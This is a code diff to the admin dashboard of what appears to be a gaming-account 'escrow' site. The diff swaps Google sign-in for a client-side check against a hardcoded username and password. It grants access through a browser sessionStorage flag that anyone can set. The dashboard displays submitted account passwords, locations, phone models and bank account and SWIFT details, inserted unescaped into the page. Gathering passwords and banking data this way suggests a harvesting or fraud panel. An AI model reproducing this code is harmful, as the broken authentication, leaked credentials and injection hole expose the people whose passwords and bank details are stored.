@@ -56,6 +56,36 @@
             border: 1px solid var(--glass-border);
             max-width: 400px;
             width: 100%;
+            text-align: left;
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+            margin-bottom: 16px;
+        }
+
+        .form-group label {
+            font-size: 0.875rem;
+            font-weight: 600;
+            color: var(--text-primary);
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 10px 14px;
+            border-radius: var(--radius-md);
+            border: 1px solid var(--glass-border);
+            background: var(--bg-main);
+            font-family: inherit;
+            font-size: 0.95rem;
+            outline: none;
+        }
+
+        .form-group input:focus {
+            border-color: #8b5cf6;
+            background: #ffffff;
         }
 
         /* Dashboard Main Layout */
@@ -141,32 +171,54 @@
         }
 
         .btn-action {
-            padding: 10px 20px;
+            padding: 12px 20px;
             border-radius: 9999px;
             background: var(--gradient-primary);
             color: white;
             font-weight: 600;
             cursor: pointer;
             border: none;
+            width: 100%;
         }
 
         .btn-logout {
             background: var(--danger-red);
+            width: auto;
+            padding: 10px 20px;
+        }
+
+        .error-msg {
+            color: var(--danger-red);
+            font-size: 0.85rem;
+            margin-top: 8px;
+            display: none;
         }
     </style>
 </head>
 <body>
 
-    <!-- Access Gate (Shown if not logged in) -->
+    <!-- Access Gate (Username / Password Login) -->
     <div id="authGate">
         <div class="gate-card">
-            <h2 style="margin-bottom: 12px; font-size: 1.5rem;">Admin Access Only</h2>
-            <p style="color: var(--text-muted); font-size: 0.9rem; margin-bottom: 24px;">Please sign in with your authorized admin account to view the secure dashboard.</p>
-            <button id="adminLoginBtn" class="btn-action" style="width: 100%;">Sign In with Google</button>
+            <h2 style="margin-bottom: 8px; font-size: 1.5rem; text-align: center;">Admin Access</h2>
+            <p style="color: var(--text-muted); font-size: 0.875rem; margin-bottom: 20px; text-align: center;">Enter your credentials to unlock the dashboard.</p>
+            
+            <form id="adminLoginForm">
+                <div class="form-group">
+                    <label for="adminUsername">Username</label>
+                    <input type="text" id="adminUsername" placeholder="Enter admin username" required>
+                </div>
+                <div class="form-group">
+                    <label for="adminPassword">Password</label>
+                    <input type="password" id="adminPassword" placeholder="Enter admin password" required>
+                </div>
+                <button type="submit" class="btn-action">Sign In to Dashboard</button>
+                <div class="error-msg" id="loginError">Invalid username or password.</div>
+            </form>
         </div>
     </div>
 
-    <!-- Secure Dashboard Content (Hidden until authenticated) -->
+    <!-- Secure Dashboard Content -->
     <div id="dashboardContent">
         <div class="dashboard-header">
             <div>
@@ -199,17 +251,9 @@
         </div>
     </div>
 
-    <!-- Firebase SDK & Dashboard Sync Script (Redirect Mode) -->
+    <!-- Firebase SDK & Dashboard Logic -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-        import { 
-            getAuth, 
-            signInWithRedirect, 
-            getRedirectResult, 
-            GoogleAuthProvider, 
-            signOut, 
-            onAuthStateChanged 
-        } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
         import { 
             getFirestore, 
             collection, 
@@ -231,47 +275,49 @@
         };
 
         const app = initializeApp(firebaseConfig);
-        const auth = getAuth(app);
         const db = getFirestore(app);
-        const googleProvider = new GoogleAuthProvider();
 
         const authGate = document.getElementById('authGate');
         const dashboardContent = document.getElementById('dashboardContent');
-        const adminLoginBtn = document.getElementById('adminLoginBtn');
+        const adminLoginForm = document.getElementById('adminLoginForm');
+        const loginError = document.getElementById('loginError');
         const adminLogoutBtn = document.getElementById('adminLogoutBtn');
         const escrowFeed = document.getElementById('escrowFeed');
         const chatFeed = document.getElementById('chatFeed');
 
-        // Check for Google Redirect Result on page load
-        getRedirectResult(auth).catch((error) => {
-            console.error("Admin Redirect Login Error:", error);
-        });
+        // Check persistent session on load
+        if (sessionStorage.getItem('gamermaid_admin_auth') === 'true') {
+            showDashboard();
+        }
 
-        // Admin Google Login via Redirect Mode
-        adminLoginBtn.addEventListener('click', async () => {
-            try {
-                await signInWithRedirect(auth, googleProvider);
-            } catch (error) {
-                alert("Login failed: " + error.message);
-            }
-        });
+        // Handle Admin Login Submission
+        adminLoginForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            const usernameInput = document.getElementById('adminUsername').value.trim();
+            const passwordInput = document.getElementById('adminPassword').value;
 
-        // Admin Logout
-        adminLogoutBtn.addEventListener('click', async () => {
-            await signOut(auth);
-        });
-
-        // Monitor Auth Security Gate
-        onAuthStateChanged(auth, (user) => {
-            if (user) {
-                authGate.style.display = 'none';
-                dashboardContent.style.display = 'block';
-                loadRealtimeData();
+            if (usernameInput === 'kgking' && passwordInput === 'Mckaungking@23') {
+                sessionStorage.setItem('gamermaid_admin_auth', 'true');
+                loginError.style.display = 'none';
+                showDashboard();
             } else {
-                authGate.style.display = 'flex';
-                dashboardContent.style.display = 'none';
+                loginError.style.display = 'block';
             }
         });
+
+        // Logout
+        adminLogoutBtn.addEventListener('click', () => {
+            sessionStorage.removeItem('gamermaid_admin_auth');
+            authGate.style.display = 'flex';
+            dashboardContent.style.display = 'none';
+            adminLoginForm.reset();
+        });
+
+        function showDashboard() {
+            authGate.style.display = 'none';
+            dashboardContent.style.display = 'block';
+            loadRealtimeData();
+        }
 
         // Real-time Firestore Listeners
         function loadRealtimeData() {
@@ -280,7 +326,7 @@
             onSnapshot(escrowQuery, (snapshot) => {
                 escrowFeed.innerHTML = "";
                 if (snapshot.empty) {
-                    escrowFeed.innerHTML = `<p style="color: var(--text-muted); text-align: center;">No escrow submissions yet.</p>`;
+                    escrowFeed.innerHTML = `<p style="color: var(--text-muted); text-align: center; margin-top: 40px;">No escrow submissions yet.</p>`;
                     return;
                 }
                 snapshot.forEach((doc) => {
@@ -294,6 +340,7 @@
                         <p><b>Password:</b> ${data.password}</p>
                         <p><b>Location / Model:</b> ${data.signinLocation} | ${data.phoneModel}</p>
                         <p><b>Bank:</b> ${data.bankName} (${data.accountNumber} - ${data.accountHolder})</p>
+                        <p><b>SWIFT Code:</b> ${data.swiftCode || 'N/A'}</p>
                     `;
                     escrowFeed.appendChild(item);
                 });
@@ -304,7 +351,7 @@
             onSnapshot(chatQuery, (snapshot) => {
                 chatFeed.innerHTML = "";
                 if (snapshot.empty) {
-                    chatFeed.innerHTML = `<p style="color: var(--text-muted); text-align: center;">No chat messages yet.</p>`;
+                    chatFeed.innerHTML = `<p style="color: var(--text-muted); text-align: center; margin-top: 40px;">No chat messages yet.</p>`;
                     return;
                 }
                 snapshot.forEach((doc) => {
